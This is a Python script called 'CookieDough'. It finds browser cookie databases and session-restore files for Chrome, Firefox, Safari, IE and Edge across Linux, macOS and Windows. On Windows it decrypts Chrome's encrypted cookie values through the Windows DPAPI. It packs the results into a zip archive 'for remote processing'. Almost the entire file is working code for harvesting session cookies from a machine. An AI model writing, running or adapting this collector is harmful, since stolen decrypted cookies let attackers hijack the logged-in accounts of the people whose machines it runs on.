#!/env/usr/bin python
import platform
import os
try:
    import win32crypt                   # https://sourceforge.net/projects/pywin32/
except:
    if platform.system() == "Windows":
        print("No win32crypt, Windows Chrome decryption won't be enabled. See README for details.")
import json
import sqlite3
from glob import glob
from zipfile import ZipFile
# TODO: Support dumping from multiple Firefox (and Chrome?) profiles


class CookieDough:
    """ 
    This is our class that will do all the heavy lifting, I like making it it's own class so
    that others can use it in their projects as well relatively easily. Plus sometimes you just want
    to run some other tools
    """
    # This hash sets up all of the locations for all of the locations for supported browsers.
    # Know a default location that we have missed? Please submit a PR
    ENVIRONMENT_HASH = {
        "Linux": {"Chrome":["$HOME/.config/google-chrome/Default/Cookies"],
            "Firefox":["$HOME/.mozilla/firefox/*.default/cookies.sqlite",
                        "$HOME/.mozilla/firefox/*.default/sessionstore-backups/recovery.js"],
            "Safari":["/dev/null"]},
        "macOS": {"Chrome":["$HOME/Library/Application Support/Google/Chrome/Default/Cookies"],
            "Safari":["$HOME/Library/Cookies/Cookies.binarycookies"],
            "Firefox":["$HOME/Library/Application Support/Firefox/Profiles/*.default/cookies.sqlite",
                    "$HOME/Library/Application Support/Firefox/Profiles/*.default/sessionstore-backups/recovery.jsonlz4"]},
        "Windows": {"Chrome":["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies"],
            "Firefox":["%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite",
                     "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\sessionstore-backups\\recovery.jsonlz4"],
            "IE":["%APPDATA%\\Microsoft\\Windows\\Cookie", 
                "%APPDATA%\\Microsoft\\Windows\\Cookies\\Low",
                "%LOCALAPPDATA%\\Microsoft\\Windows\\INetCookies",
                "%LOCALAPPDATA%\\Microsoft\\Windows\\INetCookies\\Low",
                "%LOCALAPPDATA%\\Packages\\windows_ie_ac_001\\AC\\INetCookies"],
            "Edge":["%LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies",
                "%LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies",
                "%LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!006\\MicrosoftEdge\\Cookies",
                "%LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!121\\MicrosoftEdge\\Cookies",
                "%LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies"]}
        }
    # This hash is used to tell the processing code how to actually read the data from a browser.
    # I'd rather see it setup this way than to have individual functions for them
    # There are some REALLY cool tricks that we can setup for this that you will find super cool
    COOKIE_STORAGE_METHODS = {
        "Firefox": {"single-file":True,"storage":"sqlite3"},
        "Chrome": {"single-file":True,"storage":"sqlite3"},
        "Safari": {"single-file":True,"storage":"binary"},
        "IE": {"single-file":False,"storage":"files"},
        "Edge": {"single-file":False,"storage":"files"} 
    }
    # Chrome SQLite comes from nicerobot on github

    def __init__(self):
        """
        We setup all of the default stuff that we need here, we can if we want add in some other possible 
        variables that can be added, such as forcing the OS, Browser, and Cookie location. 
        """
        self.operating_system = self.determine_backend_os()
        self.cookie_files = []

    def determine_backend_os(self):
        """
        Because we need to know what operating system that we are dealing with, and we want this to be
        as openly available as possible. If you know of an OS that isn't correct, please add it and PR.
        """
        os_comparison = {
            "Darwin":"macOS",
            "Linux":"Linux",
            "Windows":"Windows"
        }
        return os_comparison[platform.system()]

    def os(self):
        """
        Helper function to return operating system as a smaller bit of code for large ugly blocks
        """
        return self.operating_system


    def findCookieFiles(self):
        """
        This function finds the cookie files and puts them into the cookie files
        """
        for browser in self.ENVIRONMENT_HASH[self.os()].keys():
            for location in self.ENVIRONMENT_HASH[self.os()][browser]:
                expanded_location = os.path.expandvars(location)
                folders_to_check = []
                if "*" in expanded_location:
                    folders_to_check = glob(expanded_location)
                else:
                    folders_to_check.append(expanded_location)
                for folder in folders_to_check:
                    if self.COOKIE_STORAGE_METHODS[browser].get("single-file",True):
                        self.cookie_files.append({"file":os.path.expandvars(folder),"methods":self.COOKIE_STORAGE_METHODS[browser],"browser":browser,"os":self.os()})
                    else:
                        print(expanded_location)
                        print(folder)
                        if os.path.exists(folder):
                            for file in os.listdir(folder):
                                self.cookie_files.append({"file":os.path.expandvars("%s\\%s"%(folder,file)),"methods":self.COOKIE_STORAGE_METHODS[browser],"browser":browser,"os":self.os()})
        return self.cookie_files


    def decryptWindowsChrome(self):
        cookies = {}
        print(self.ENVIRONMENT_HASH["Windows"]["Chrome"])
        conn = sqlite3.connect(os.path.expandvars(self.ENVIRONMENT_HASH["Windows"]["Chrome"][0]))
        c = conn.cursor()
        query = "select * from cookies;"
        c.execute(query)
        cookie_dump = c.fetchall()

        # Actual cookie_dump includes (in order) creation_utc, host_key, name,
        # value, path, expires_utc, secure, httponly, last_access_utc,
        # has_expires, persistent, priority, encrypted_value, firstpartyonly
        for cookie in cookie_dump:
            dump = {}
            print(cookie)
            dump["domain"] = cookie[1]                                          # host_key       
            dump["cookie-name"] = cookie[2]                                     # name 
            try:
                dump["cookie-value"] = win32crypt.CryptUnprotectData(cookie[12], None, None, None, 0)[1].decode('utf-8')   # encrypted_value
            except:
                dump["cookie-value"] = cookie[2] or 0
            dump["host"] = cookie[1]                                            # host_key
            dump["path"] = cookie[4]
            dump["secure"] = False if cookie[6] == 0 else True

            if cookie[1] in cookies:
                cookies[cookie[1]].append(dump)
            else:
                cookies[cookie[1]] = []
                cookies[cookie[1]].append(dump)

        return self.saveCookies(cookies)


    def saveCookies(self,cookies):
        cookieFile = open("ChromeCookies.json", "w")
        cookieFile.write(json.dumps(cookies))
        cookieFile.close()
        return "ChromeCookies.json"


    def zipCookieFiles(self):
        """
        Processes all of the cookie files that we have in the class and creates a zip for them and formats them
        for remote processing
        """ 
        gen_info = open("package_info.txt","w")
        gen_info.write("%s"%(self.os()))
        gen_info.close()
        with ZipFile("cookie_dough.zip","w") as zfile:
            zfile.write("package_info.txt")
            for file in self.cookie_files:
                zfile.write(file["file"],"%s/%s"%(file["browser"],os.path.basename(file["file"])))
            if self.os() == "Windows":
                zfile.write(self.decryptWindowsChrome(),"Chrome\\ChromeCookies.json")


def main():

    cookie_class = CookieDough()
    cookie_class.findCookieFiles()
    cookie_class.zipCookieFiles()


if __name__ == "__main__":
    main()

